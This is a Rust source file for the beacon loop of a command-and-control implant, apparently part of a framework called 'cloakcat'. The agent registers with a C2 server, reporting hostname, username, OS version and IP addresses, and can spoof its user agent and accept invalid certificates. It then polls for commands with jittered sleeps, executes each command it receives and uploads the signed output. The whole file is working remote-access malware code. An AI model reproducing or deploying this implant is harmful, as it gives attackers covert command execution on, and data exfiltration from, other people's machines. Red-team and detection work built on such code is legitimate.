//! Beacon loop: poll for commands, execute, upload results.

macro_rules! debug_log {
    ($($arg:tt)*) => {
        #[cfg(debug_assertions)]
        eprintln!($($arg)*);
    }
}

use std::env;
use std::time::Duration;

use anyhow::Context;
use cloakcat_protocol::{profile_by_name, sign_result, Command, DerivedKeys, Endpoints, ResultReq};
use rand::Rng;
use reqwest::Client;
use tokio::time::sleep;

use crate::config::load_agent_config;
use crate::exec::run_command;
use crate::host::{collect_hostname, collect_ip_addrs, collect_os_version, collect_username};

fn rand_between(min_ms: u64, max_ms: u64) -> Duration {
    if min_ms >= max_ms {
        return Duration::from_millis(min_ms);
    }
    let mut rng = rand::rng();
    let v = rng.random_range(min_ms..=max_ms);
    Duration::from_millis(v)
}

fn advance_backoff(current: Option<u64>, max_ms: u64) -> u64 {
    match current {
        Some(b) => (b * 2).min(max_ms),
        None => 2_000,
    }
}

async fn send_result(
    client: &Client,
    result_url: &str,
    agent_id: &str,
    signing_key: &[u8],
    auth_token: &str,
    cmd_id: &str,
    exit_code: i32,
    stdout: &str,
    stderr: &str,
) -> anyhow::Result<()> {
    let signature = sign_result(agent_id, cmd_id, stdout, signing_key);
    let body = ResultReq {
        cmd_id: cmd_id.to_string(),
        exit_code,
        stdout: stdout.to_string(),
        stderr: stderr.to_string(),
        signature,
    };

    let res = client.post(result_url).header("X-Agent-Token", auth_token).json(&body).send().await?;
    if !res.status().is_success() {
        let status = res.status();
        let text = res.text().await.unwrap_or_default();
        anyhow::bail!("status={} body={}", status, text);
    }
    Ok(())
}

fn load_or_create_agent_id() -> String {
    let id_path = std::env::var("AGENT_ID_FILE")
        .map(std::path::PathBuf::from)
        .unwrap_or_else(|_| {
            std::env::current_exe()
                .unwrap_or_else(|_| std::path::PathBuf::from("."))
                .parent()
                .unwrap_or_else(|| std::path::Path::new("."))
                .join(".agent_id")
        });

    if let Ok(id) = std::fs::read_to_string(&id_path) {
        let id = id.trim().to_string();
        if uuid::Uuid::parse_str(&id).is_ok() {
            return id;
        }
    }

    let new_id = uuid::Uuid::new_v4().to_string();
    let _ = std::fs::write(&id_path, &new_id);
    new_id
}

pub async fn run() -> anyhow::Result<()> {
    let cfg = load_agent_config().context("config load failed")?;

    let profile = profile_by_name(&cfg.profile_name);

    let mut builder = Client::builder();
    if let Some(ua) = profile.user_agent() {
        let mut headers = reqwest::header::HeaderMap::new();
        headers.insert(
            reqwest::header::USER_AGENT,
            reqwest::header::HeaderValue::from_str(ua)
                .expect("profile user_agent must be valid header value"),
        );
        builder = builder.default_headers(headers);
    }
    if cfg.c2_url.starts_with("https://") {
        let accept_invalid = env::var("AGENT_ACCEPT_INVALID_CERTS").as_deref() == Ok("1");
        builder = builder.danger_accept_invalid_certs(accept_invalid);
    }
    let client = builder.build()?;

    let agent_id = load_or_create_agent_id();

    let reg = cloakcat_protocol::RegisterReq {
        agent_id: agent_id.clone(),
        platform: {
            #[cfg(target_os = "windows")]
            { "windows".to_string() }
            #[cfg(target_os = "macos")]
            { "darwin".to_string() }
            #[cfg(not(any(target_os = "windows", target_os = "macos")))]
            { "linux".to_string() }
        },
        hostname: collect_hostname(),
        username: collect_username(),
        os_version: collect_os_version(),
        ip_addrs: collect_ip_addrs(),
        alias: cfg.alias.clone(),
        note: cfg.note.clone(),
    };

    let endpoints = Endpoints::new(&cfg.c2_url, &cfg.profile_name, &agent_id);

    // Derive auth + signing keys from the shared master token via HKDF.
    let keys = DerivedKeys::from_master(cfg.shared_token.as_bytes());
    let auth_token = keys.auth_token();

    // SECURITY: auth_token is sent in plaintext over HTTP.
    // Set c2_url to https:// and configure TLS on the server for production use.
    let resp = client
        .post(&endpoints.register)
        .header("X-Agent-Token", &auth_token)
        .json(&reg)
        .send()
        .await?;
    let reg_json: cloakcat_protocol::RegisterResp = resp.json().await?;
    debug_log!("Registered: {:?}", reg_json);

    let beacon_min = env::var("AGENT_BEACON_MIN_MS")
        .ok()
        .and_then(|v| v.parse().ok())
        .unwrap_or(5_000);
    let beacon_max = env::var("AGENT_BEACON_MAX_MS")
        .ok()
        .and_then(|v| v.parse().ok())
        .unwrap_or(8_000);
    let backoff_max = env::var("AGENT_BACKOFF_MAX_MS")
        .ok()
        .and_then(|v| v.parse().ok())
        .unwrap_or(60_000);
    let mut backoff_ms: Option<u64> = None;

    loop {
        let url = format!("{}?hold=45", endpoints.poll);

        let res = match client.get(&url).header("X-Agent-Token", &auth_token).send().await {
            Ok(r) => r,
            Err(e) => {
                debug_log!("[agent] poll send error: {e} -> backoff");
                let next = advance_backoff(backoff_ms, backoff_max);
                backoff_ms = Some(next);
                sleep(rand_between(next / 2, next)).await;
                continue;
            }
        };

        if res.status().as_u16() == 204 {
            debug_log!("[agent] poll: 204 no content -> sleep jitter");
            backoff_ms = None;
            sleep(rand_between(beacon_min, beacon_max)).await;
            continue;
        }
        if !res.status().is_success() {
            debug_log!("[agent] poll error: {} -> sleep jitter", res.status());
            let next = advance_backoff(backoff_ms, backoff_max);
            backoff_ms = Some(next);
            sleep(rand_between(next / 2, next)).await;
            continue;
        }

        let text = match res.text().await {
            Ok(t) => t,
            Err(e) => {
                debug_log!("[agent] poll read error: {e} -> backoff");
                let next = advance_backoff(backoff_ms, backoff_max);
                backoff_ms = Some(next);
                sleep(rand_between(next / 2, next)).await;
                continue;
            }
        };
        let trimmed = text.trim();
        if trimmed == "{}" || trimmed.is_empty() {
            backoff_ms = None;
            sleep(rand_between(beacon_min, beacon_max)).await;
            continue;
        }

        let cmd: Command = match serde_json::from_str(trimmed) {
            Ok(c) => c,
            Err(e) => {
                debug_log!("[agent] poll JSON parse error: {e}. raw={}", trimmed);
                backoff_ms = None;
                sleep(rand_between(beacon_min, beacon_max)).await;
                continue;
            }
        };
        debug_log!("[agent] poll: got cmd id={} cmd={}", cmd.cmd_id, cmd.command);

        let (exit_code, stdout, stderr) = match run_command(&cmd).await {
            Ok(triple) => triple,
            Err(e) => {
                debug_log!("[agent] exec error: {e} -> send minimal result");
                let exit_code = -1;
                let stdout = String::new();
                let stderr = format!("exec error: {e}");
                if let Err(e) = send_result(
                    &client,
                    &endpoints.result,
                    &agent_id,
                    &keys.signing_key,
                    &auth_token,
                    &cmd.cmd_id,
                    exit_code,
                    &stdout,
                    &stderr,
                )
                .await
                {
                    debug_log!("[agent] result upload after exec error failed: {e}");
                }
                backoff_ms = None;
                sleep(rand_between(beacon_min, beacon_max)).await;
                continue;
            }
        };

        debug_log!(
            "[agent] exec done: exit={} stdout_len={} stderr_len={}",
            exit_code,
            stdout.len(),
            stderr.len()
        );

        if let Err(e) = send_result(
            &client,
            &endpoints.result,
            &agent_id,
            &keys.signing_key,
            &auth_token,
            &cmd.cmd_id,
            exit_code,
            &stdout,
            &stderr,
        )
        .await
        {
            debug_log!("[agent] result upload failed: {e} -> sleep jitter");
            let next = advance_backoff(backoff_ms, backoff_max);
            backoff_ms = Some(next);
            sleep(rand_between(next / 2, next)).await;
            continue;
        } else {
            debug_log!("[agent] result uploaded: id={} ok", cmd.cmd_id);
        }

        backoff_ms = None;
        sleep(rand_between(beacon_min, beacon_max)).await;
    }
}
